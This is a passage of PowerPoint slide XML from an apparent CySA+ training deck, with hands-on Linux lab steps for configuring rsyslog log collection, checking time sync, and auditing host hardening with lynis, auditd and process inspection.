            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ chronyc tracking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Inspect the rsyslog configuration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The main file routes messages by facility (auth, cron, kern, mail, daemon, local0–7) and severity (emerg, alert, crit, err, warning, notice, info,…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat /etc/rsyslog.conf</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Generate logs at each severity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>logger is the standard tool to inject a syslog message from the shell.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ logger -p user.info "lab1: info message"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Configure a central collector (loopback test)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Edit /etc/rsyslog.d/10-collector.conf:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; /etc/rsyslog.d/10-collector.conf &lt;&lt;'EOF'</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272</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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1 — Hands-On Steps (cont'd)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4434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44348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05840" y="377190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3771900"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Confirm receiver is listening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>You should see rsyslogd bound to UDP/514.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726180"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726180"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ss -ulnp | grep :514</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273</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The 8 syslog severity levels and how to filter on them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to inject messages with logger and follow them in /var/log/syslog.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to centralise logs over UDP/514 with rsyslog.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Why time sync is required before correlation — and how to verify it with chronyc.</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274</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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2 — OS Hardening and System Process Inspection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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will audit a Linux host with lynis, enable kernel-level auditing with auditd, and inspect running processes, kernel modules, and hardware to spot deviations from a baseline. These are exam-blueprint skills under CySA+ 1.1 (Operating system concepts — system hardening, system processes, hardware…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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275</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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2 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install hardening and audit tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>lynis is a free CIS-style hardening scanner.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y lynis auditd</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Inspect the file structure and configuration locations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cyber analysts must know where configuration lives:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ls /etc | head</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Enumerate processes (CySA+ "system processes")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Look for unexpected parents — e.g.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ps -ef --forest | head -30</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Inspect the hardware architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ expects you to know x86_64 vs ARM, CPU virtualization flags, and how to read uname for kernel version (which CVEs depend on).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ lscpu</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Run a Lynis hardening audit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>When it finishes, scroll to Suggestions and Hardening index.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ lynis audit system --quick</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276</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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2 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
